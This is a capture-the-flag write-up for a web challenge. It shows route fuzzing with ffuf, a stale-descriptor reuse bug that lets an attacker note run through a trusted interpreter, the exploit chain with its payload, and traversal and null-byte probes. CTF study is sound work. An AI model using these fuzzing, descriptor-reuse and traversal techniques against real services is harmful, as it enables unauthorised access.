# Orphaned Context

**Event:** HICyberCon CTF 2026
**Category:** web
**Flag:** `hiCTF{local_dev_fixture_not_a_real_flag_afce35cd07}`

---

Instance used: `https://orphaned-context-dc8bfe5ba667.chall.hiddeninvestigations.net`

## TL;DR - the flag

```
hiCTF{local_dev_fixture_not_a_real_flag_afce35cd07}
```

Recovered from the relay's sealed record `/incidents/IR-7731/seal` via the
orphaned-context bug (below). Reproduced on 6 independently provisioned
instances; every read returns the same 51 bytes
(`sha256 b749ad4b82d2d71cadbac6be614d0f324bdb311a581178fdbe079a290a027791`).

## Recon: the operator API is hidden from a normal wordlist

The read-only console (`/`, `/app.js`) only calls `GET /api/relay/status`,
`/api/relay/events`, `/api/incidents`. Its own comment says the privileged actions
("open captures, store notes, run recovery previews") are "operator-API actions,
documented in the handout".

The handout is **not attached on the platform** for this challenge (challenge
object `files: []`, and - unlike every other challenge in the event - the
description carries no object-storage link). It had to be recovered by observation.

Discovery detail that matters: the action routes are **POST-only**, so a GET-based
wordlist reports them as non-existent. Fuzzing *two path segments*
(`ffuf -mc all -w w1.txt:W1 -w w2.txt:W2 -u $B/api/W1/W2 -fr not_found`) surfaces
them immediately, because a real POST-only route answers `GET -> 405` while an
unknown route answers `404 {"error":"not_found"}`.

Complete operator API:

| Method | Path | Body | Effect |
|---|---|---|---|
| POST | `/api/capture/open` | `{}` (body ignored) | allocates a slot; returns `request_id`, `slot`, `epoch`, `recovery_descriptor` |
| POST | `/api/capture/commit` | `{"request_id":...}` | retires the descriptor, frees the slot |
| POST | `/api/capture/interrupt` | `{"request_id":...}` | **retains** the descriptor, frees the slot |
| POST | `/api/note/store` | `{"text":...}` | stores a note in a free slot (bumps epoch) |
| POST | `/api/note/discard` | `{"note_id":...,"epoch":...}` | frees a stored note |
| POST | `/api/recover/preview` | `{"recovery_descriptor":...}` | evaluates the slot's **current** occupant |

Read-only: `GET /api/relay/status`, `/api/relay/events`, `/api/incidents`, `/api/health`.

Descriptor format: `base64url(payload) + "." + sig(32 bytes)`;
`payload = {"rid","slot","epoch","kind":"recovery"}`. Signature is instance-bound;
all tamper attempts → `400 invalid_descriptor`. The bug is not forging a
descriptor - it is **reusing** a legitimately issued one.

## The bug

`recover/preview` validates the descriptor, extracts its `slot`, then resolves the
**live** occupant of that slot and evaluates it, without comparing the occupant's
epoch to the descriptor's epoch. It records the mismatch and proceeds:

```
{"seq":9,"type":"RECOVER_PREVIEW","request_id":"cap-0004",
 "descriptor_epoch":1,"slot":0,"occupant_epoch":2,"occupant":"note"}
```

A capture occupant evaluates as `format:"inert"` (preview `""`); a **note**
occupant evaluates as `format:"relay-maint/1"` with `trusted:true` - so an
attacker note is executed by the relay's diagnostic interpreter.

## Exploit

```
open      -> descriptor bound to (slot 0, epoch N)
interrupt -> descriptor RETAINED, slot freed
note.store{"text":"#!relay-maint/1\ncat /incidents/IR-7731/seal"}  -> note lands in slot 0 at epoch N+1
recover.preview{descriptor}  -> evaluates the NOTE (epoch N+1) with an epoch-N descriptor
```

Interpreter (`relay-maint/1`, verbs `help whoami pwd ls cat`) over the closed map:

```
/                              incidents/  relay/
/relay/README                  seals are filed per incident under /incidents/<id>/
/relay/identity                principal relay-maint · context diagnostic-preview · read-only
/incidents/IR-7731/manifest    status SEALED, custody "evidence seal retained", artifact seal
/incidents/IR-7731/seal        hiCTF{local_dev_fixture_not_a_real_flag_afce35cd07}
/incidents/IR-7604/manifest    status CLEARED, "no seal retained (record released)"
/incidents/IR-7604/notes       routine follow-up text
```

## Exhaustive negatives (map is really closed, no second flag)

- `help` → fixed verb list `help, whoami, pwd, ls [path], cat <path>`. Unknown
  verbs (`reveal transcript seal open recover evidence audit exec env printenv
  source run use set`) → `unknown verb: X`. No hidden verb.
- Path probes all `no such path`: `/flag /seal /relay/{flag,seal,config,secrets,key,.flag,.env}
  /incidents/IR-7731/{flag,notes,seal.txt,seal.flag,.seal} /incidents/IR-7604/seal
  /handout /relay/handout`.
- Traversal collapsed/rejected: `../`, `%2e%2e`, `..%2f`, `//flag`, `/./././flag`,
  null-byte tricks, `./`→"is a directory".
- API surface re-fuzzed (GET+POST, root and `/api/*`, 38 KB wordlist): every
  non-index hit is `404 not_found`; only the six operator routes exist. Malformed
  bodies, wrong methods, huge descriptors → no 5xx, no stack trace, no leak.
- Static assets (`/`, `/app.js`, `/style.css`) and all GET JSON contain no `hiCTF{`.
- A *matched* recovery (open → preview, no orphan) returns `format:"inert"`,
  `preview:""`; after `commit` the descriptor is `410 descriptor_retired`. So the
  orphan-note path is the only one that yields interpreter output.

## Cross-instance A/B - byte-for-byte

`exploit.py` run against six independently provisioned instances, each with its own
hostname and fresh relay state; every read taken after a full exploitation chain:

| instance (host suffix) | seal | sha256 |
|---|---|---|
| `dc8bfe5ba667` | `hiCTF{local_dev_fixture_not_a_real_flag_afce35cd07}` | `b749ad4b…27791` |
| `2cc1512386ef` | same | `b749ad4b…27791` |
| `9da350f887c8` | same | `b749ad4b…27791` |
| `a07d1adb3a76` | same | `b749ad4b…27791` |
| `4ccc4b062fe2` | same | `b749ad4b…27791` |
| `6980cc075628` | same | `b749ad4b…27791` |

The value is static in the deployed image (the seal is not re-substituted per
instance).
